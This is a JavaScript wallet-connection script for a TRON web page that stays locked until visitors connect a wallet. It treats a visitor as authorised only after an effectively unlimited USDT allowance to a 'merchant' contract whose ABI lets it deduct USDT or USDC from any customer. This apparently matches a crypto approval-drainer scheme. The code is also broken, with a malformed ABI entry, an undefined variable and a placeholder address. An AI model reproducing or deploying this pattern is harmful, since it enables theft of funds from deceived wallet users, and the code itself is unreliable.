// --- 配置常量 (TRON 专属) ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，可以不修改 (用于初始化， 如果无法自动获取地址)
const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";

// 你的合约 ABI (SimpleMerchantERC)
const MERCHANT_ABI = [
    {"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},
    {"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},
    {"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},
    {"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},
    {"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},
    {"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},
    {"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","type":"Function"},
    {"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},
    {"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}
];

// TRC20 代币的 ABI (USDT)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');
const overlay = document.getElementById('blurOverlay');  // 确保在这里定义
const statusDiv = document.getElementById('status');  //  获取 status 元素，在外面定义，避免重复获取。

// --- 状态变量 ---
let tronWeb;
let userAddress; //  Base58 格式
let userAddressHex; // Hex 格式
let merchantContract;
let usdtContract;
let isConnectedFlag = false;
let accountChangeListener = null;  // 存储账号改变的监听器
let connector; // WalletConnect 连接器

// --- 遮罩控制函數 ---
function hideOverlay() {
    if (!overlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlay.style.opacity = '0';
    setTimeout(() => {
        overlay.style.display = 'none';
    }, 300);
}

function showOverlay(message) {
    if (!overlayMessage || !blurOverlay) {
        console.error("Overlay element not found.");
        return;
    }
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => {
        overlay.style.opacity = '1';
    }, 10);
}

// --- 状态更新函数 ---
function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connectButton) {
        if (connected && address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title = `Connected: ${address}`;
            hideOverlay(); // 隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title = 'Connect Wallet';
             //  连接失败，显示遮罩
        }
    }
}

// --- 核心功能：控制状态栏的隐藏与显示。 ---
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (!statusDiv) {
        console.error("Status element not found.");
        return; // 避免设置 innerHTML
    }
    statusDiv.innerHTML = message;
    statusDiv.style.display = 'block';
}

// --- 初始化合约 (TRON 版本) ---
async function initialize() {
    try {
        if (!userAddress) {
            updateConnectionUI(false);
            return;
        }

        // 1. 初始化合约实例
        if (!tronWeb) {
            console.error("TronWeb not initialized.");
            return;
        }

        merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
        usdtContract = await tronWeb.contract(ERC20_ABI, USDT_CONTRACT_ADDRESS);

        console.log("✅ Contracts initialized.");

    } catch (error) {
        console.error("Initialization failed:", error);
        updateStatus(`Initialization failed: ${error.message}`);
        showOverlay(`Initialization failed: ${error.message}`);
    }
}

// --- 检查授权状态 (TRON 版本) ---
async function checkAuthorization() {
    try {
        if (!tronWeb || !userAddressHex || !merchantContract || !usdtContract) {  //  重点：使用 userAddressHex
            showOverlay('Wallet not opened. Please connect.');
            return;
        }

        // 1. 检查 SimpleMerchant 合约授权
        const isAuthorized = await merchantContract.authorized(userAddressHex).call();

        // 2. 检查 USDT 的授权
        const usdtAllowance = await usdtContract.allowance(userAddress, MERCHANT_CONTRACT_ADDRESS).call();
        const isUsdtMaxApproved = usdtAllowance.gte(tronWeb.toBigNumber(ALMOST_MAX_UINT));

        let statusMessage = '';

        // SimpleMerchant 合約授權
        if (isAuthorized) {
            statusMessage += 'Web page access authorized ✅. ';
        } else {
            statusMessage += 'Web page access not authorized ❌. ';
        }

        // USDT 的授權狀態
        if (isUsdtMaxApproved) {
            statusMessage += `USDT approved ✅.`;
        } else if (usdtAllowance > 0) { // 检查大于 0
            statusMessage += `USDT approval needed ⚠️.`;
        } else {
            statusMessage += `USDT not approved ❌.`;
        }

        // Button state: needs to be clicked if authorization is incomplete
        const allAuthorized = isAuthorized && isUsdtMaxApproved;  // 只检查 USDT 授权

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(''); // 成功時，清空/隱藏狀態欄
            hideOverlay(); // 完全授權，隐藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
            connectButton.disabled = false;
            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
             //  保持遮罩显示，等待授权
        }
    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

// --- 连接钱包逻辑 (TRON 版本) ---
async function connectWallet() {
    console.log("connectWallet called - START");
    try {
        updateStatus('Connecting to wallet...');
        showOverlay('Please confirm the connection request in your wallet...');

        // 1.  检测 TronWeb (这个步骤，在 Trust Wallet  中， 可能会有问题。)
        if (typeof window.tronWeb === 'undefined') {
            updateStatus('Please install TronLink or a supported TRON wallet');
            console.log("Error: tronWeb is undefined. Please install TronLink or a supported TRON wallet");
            return;
        }

        // ** 强制重新初始化 TronWeb  (尝试).  增加 this, 可以减少问题.
        try {
            tronWeb = new window.TronWeb({  //  尝试强制重新初始化
                fullHost: 'https://api.trongrid.io', //  或者其他的 TRON 节点,  或者， 使用 "https://api.shasta.trongrid.io" (测试网)
            });
            console.log("TronWeb re-initialized:", tronWeb);
        } catch (reinitError) {
            console.error("Error re-initializing TronWeb:", reinitError);
            updateConnectionUI(false);
            showOverlay('🔴 Connection failed: TronWeb initialization failed.');
            updateStatus('Connection failed: TronWeb initialization failed.');
            return;
        }

        // 2.  初始化 WalletConnect  （如果已经安装了）
        //  如果已经连接， 那么， 不用显示二维码， 并且， 不用创建 session
        //   如果没有连接， 那么需要 WalletConnect  的流程。

        if (!connector) {
            //  确保已经安装了 WalletConnect 库
            if (typeof window.WalletConnect === 'undefined' || typeof window.QRCodeModal === 'undefined') {
                console.error("Error: WalletConnect or QRCodeModal not found. Please check the library imports.");
                updateConnectionUI(false);
                showOverlay('🔴 Connection failed: WalletConnect library not loaded.');
                updateStatus('Connection failed: WalletConnect library not loaded.');
                return;
            }
            const { Client, QRCodeModal } = window.WalletConnect; //  <-- 从 window  上获取
            connector = new Client({
                bridge,
                qrcodeModal: QRCodeModal,
            });
             console.log("WalletConnect connector created:", connector);
        }
        // 3. 尝试连接 WalletConnect
        try {
            if (!connector.connected) {
                //  如果尚未连接，  就创建一个新的 session. 并且显示二维码
                await connector.createSession(); //  创建 session
                console.log("✅ WalletConnect session created.");

                //  显示二维码， 让用户扫描
                QRCodeModal.open(connector.uri, () => {
                    //  如果用户取消了,  显示连接失败
                    updateConnectionUI(false);
                    showOverlay('🔴 Connection failed: Connection canceled.');
                    updateStatus('Connection failed: Connection canceled.');
                });
            }
        } catch (createSessionError) {
            console.error("Error creating WalletConnect session:", createSessionError);
            updateConnectionUI(false);
            showOverlay('🔴 Connection failed: Could not initialize WalletConnect.');
            updateStatus('Connection failed: Could not initialize WalletConnect.');
            return;
        }
        // 4.  获取用户地址 (使用 WalletConnect )
        if (connector.connected) {
            const ethereumAddress = connector.accounts[0]; // 获取以太坊地址
            console.log("✅ Ethereum Address from WalletConnect:", ethereumAddress);

            //  TODO: 将以太坊地址转换为 TRON 地址.  （**非常重要**）
            //  由于没有直接获取 TRON 地址的方法， 只能使用占位符.
            //  **你必须替换这个占位符！**
            //  可以尝试获取 TRX  地址,   如果可以.  例如：
            //   userAddress = await window.tronWeb.trx.getAccount();  // 这个方法，可能不行。 只能猜测 Trust Wallet 的api了。
            userAddress = "T..." +  ethereumAddress.slice(-4); //  <---  占位符， 使用以太坊地址的后四位.   **替换为实际的地址转换代码!**

            // 验证地址
            if (!tronWeb.isAddress(userAddress)) {
                console.error("Error: Invalid (假定) TRON address from WalletConnect:", userAddress);
                updateConnectionUI(false);
                showOverlay('🔴 Connection failed: Invalid  (假定) TRON address.');
                updateStatus('Connection failed: Invalid TRON address.');
                return;
            }
            userAddressHex = tronWeb.address.toHex(userAddress); // 将 Base58 转换为 Hex 格式
            console.log("✅ User Address (Hex) (假定):", userAddressHex);

            updateConnectionUI(true, userAddress);

            // 5. 初始化合约并检查授权
            await initialize();
        } else {
            console.log("WalletConnect: Not connected.");
            updateConnectionUI(false);
            showOverlay('🔴 Connection failed: Not connected to WalletConnect.');
            updateStatus('Connection failed: Not connected to WalletConnect.');
        }

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        updateStatus(`Connection failed: ${error.message}`);
    }
    console.log("connectWallet called - END");
}

// --- 斷開錢包連接 ---
function disconnectWallet() {
    // 1. 重置状态
    userAddress = null;
    userAddressHex = null;
    tronWeb = null;  // 必须设置为 null
    merchantContract = null;
    usdtContract = null;
    isConnectedFlag = false; // 重置 isConnectedFlag
    updateConnectionUI(false);
    showOverlay('Please link your wallet to unlock the page 🔒');
    // 2. 关闭 WalletConnect Session (如果连接过)
    if (connector && connector.connected) {
        connector.killSession(); //  关闭 WalletConnect Session
        connector = null; // 移除连接器
    }
}

// 事件监听器 (与之前类似)
connectButton.addEventListener('click', () => {
    if (isConnectedFlag) {
        disconnectWallet(); // 断开钱包
    } else {
        connectWallet(); // 连接钱包
    }
});

// 页面加载完成后，初始化 (尝试在页面加载时初始化)
window.onload = () => {
    //  在页面加载的时候，尝试连接, 并且，初始化 WalletConnect。
    console.log("window.onload triggered");
};